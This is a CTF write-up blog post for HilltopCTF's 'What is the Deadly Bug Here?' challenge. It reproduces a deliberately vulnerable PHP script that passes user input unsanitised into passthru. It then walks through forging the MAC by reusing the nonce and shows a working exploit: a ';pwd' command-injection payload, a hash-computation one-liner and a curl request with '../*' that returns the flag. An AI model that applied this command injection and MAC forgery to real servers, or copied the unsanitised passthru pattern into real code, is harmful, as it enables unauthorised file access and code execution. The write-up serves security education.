layout: post
title: "What is the Deadly Bug Here?"
date: 2020-05-01
categories: CTF
---===/// HilltopCTF - What Is The Deadly Bug Here? ///===---

CTF Description: Some times ago I stumbled upon a guy who is famous in YouTube,
and I subscribed him! I think he is very passionate and thoughtful about security things,
and one day, he uploaded a video with title: "Let's play a game: what is the deadly bug
here?." I was very amazed back then. But, that video made me think: I can't just stop with
knowing the bug, I need to do better! I have to patch the code. And here I am, I patched the code and it is bug-proof.

When we initially visit the website, we are greeted with `You need to provide 'mac' and 'greet', okay?`
While viewing the headers, we are provided some handy notes left to us by the author of the code.
By passing `?debug` along, we can view their "patched" source code.
```
Headers:

HTTP/1.1 200 OK
Date: Sat, 30 May 2020 12:53:33 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.6
X-MY-GREET: aboutme.txt
X-MY-GREET-MAC: cabb57d8fb9ab6dbccbef600f370108ad331617dc5432fb55d0b4f2b7f5df01c
X-SELF-NOTE: '?debug' in case I forgot.
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 1084
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Source code visible by ?debug

?php
error_reporting(0);
ini_set('display_errors', 0);

require_once("secret.php");

function patched($alg, $string, $secret) 
{
    if (is_string($string)) {
        if ($alg === "sha256") {
            return hash($alg, $secret . $string);
        }
        else {
            header('HTTP/1.0 400 Bad Request');
            echo "That algorithm is not supported at the moment.";
            exit;
        }
    }
    else {
        header('HTTP/1.0 400 Bad Request');
        echo "Wouldn't work anymore hahahaha!";
        exit;
    }

}

$alg = "sha256";
$greet = "aboutme.txt";
header("X-MY-GREET: $greet");
header("X-MY-GREET-MAC: " . patched($alg, $greet, $secret));
header("X-SELF-NOTE: '?debug' in case I forgot.");

if (isset($_GET['debug'])) {
    highlight_file( __FILE__ );
}

if (empty($_GET['mac']) || empty($_GET['greet'])) {
    header('HTTP/1.0 400 Bad Request');
    echo "You need to provide 'mac' and 'greet', okay?";
    exit;
}

if (isset($_GET['alg'])) $alg = $_GET['alg'];

if (isset($_GET['greet'])) $greet = $_GET['greet'];

if (isset($_GET['nonce'])) $secret = patched($alg, $_GET['nonce'], $secret);

$mac = patched($alg, $greet, $secret);

// I still need to make sure the string is safe. Should this do?
$greet = filter_var($greet, FILTER_UNSAFE_RAW, FILTER_FLAG_STRIP_LOW|FILTER_FLAG_STRIP_HIGH);

if ($mac !== $_GET['mac']) {
    header('HTTP/1.0 403 Forbidden');
    echo "Nah it doesn't match.";
    exit;
}

// This is for testing, gonna make it dangerous since this won't be executed at all :).
echo passthru("cat $greet 2>&1", $err);
// echo $err;

?> You need to provide 'mac' and 'greet', okay?
```
We need to pass a mac and greet variable to the host. The headers show a `mygreet` and `mymac`, which when
passed will allow the code `echo passthru("cat $greet 2>&1", $err);` to display the greet, which is
aboutme.txt. We need to find a way to pass a greet through to find the flag. To do so we need a corresponding mac for the greet.
```
Aboutme.txt:

The code is patched by me. The 1337abcdefghijklmnopqrstuvwxyz1337 Hacker.
```
I spent several hours staring at the source code, but I'm not much of a programmer and I didn't see anything
obviously wrong. A quick youtube search turned up the video by liveoverflow referenced in the challenge
description. The video referenced an attack where he was able to set the variable nonce to an array,
causing the hash_hmac function to return a NULL, allowing him to bypass knowing the secret.
The patched code in this challenge utilizes an `is_string` check to keep you from passing an array
through, and makes sure you don't try to change the algorithm from `sha256` via `===`. The challenge also
utilizes the hash function instead of hash_hmac, making it less secure, possibly to hash
length extension attacks. Since we know greet is aboutme.txt and the corresponding hash, it seems like it could work.

I spent a whole night trying to utilize a hash length extension attack to pass through
a command to list directory contents to find the flag. After hours of failure, I went to bed
determined to find the solution. The next morning I awoke to a hint on discord that says look
at what you know and how it's calculated. I immediately realized that the function that is formulating
the hash to display in the headers is the same function that calculates secret if we set the variable nonce.
```
header("X-MY-GREET-MAC: " . patched($alg, $greet, $secret));
if (isset($_GET['nonce'])) $secret = patched($alg, $_GET['nonce'], $secret);
```
By setting the variable nonce to aboutme.txt, the secret variable will now be set to the same mac that
is passed to us through the header! Now that we control what the secret is, we can use an interactive
php shell to generate the mac for the payload we want to send. I proceeded to send `;pwd` as a payload to
find our current working directory, which is `/var/www/html`. A hint provided on the ctf website says
what we want is in the `/var/www` directory. The code we are exploiting `echo passthru("cat $greet 2>&1", $err);`
is running the cat command against whatever we pass as greet. We can cat out all files in a directory by utilizing `*`,
so I crafted a mac for `../*` and got the flag!
```
root@kali:~# php -a
Interactive mode enabled

php > echo hash("sha256", "cabb57d8fb9ab6dbccbef600f370108ad331617dc5432fb55d0b4f2b7f5df01c" . "../*");
cfe3ac764981e94d4a7ebe6123d33eee2b30c19fff05c93e5377fb07f33be9d3

root@kali:~# curl -i 192.81.210.234:10002/?mac=cfe3ac764981e94d4a7ebe6123d33eee2b30c19fff05c93e5377fb07f33be9d3\&greet='../*'\&nonce=aboutme.txt
HTTP/1.1 200 OK
Date: Fri, 29 May 2020 13:29:30 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.6
X-MY-GREET: aboutme.txt
X-MY-GREET-MAC: cabb57d8fb9ab6dbccbef600f370108ad331617dc5432fb55d0b4f2b7f5df01c
X-SELF-NOTE: '?debug' in case I forgot.
Vary: Accept-Encoding
Content-Length: 125
Content-Type: text/html; charset=UTF-8

HilltopCTF{uh...1think_1mad3_itwors3_s00wy}
That's the flag, please use them wisely.
Thankyou.cat: ../html: Is a directory
```
I spent so much time looking for an error in the code that I overlooked the human error of being supplied a greet
and corresponding match. Once I realized that the answer had been staring me in the face the
whole time I was able to solve the challenge in a matter of minutes.
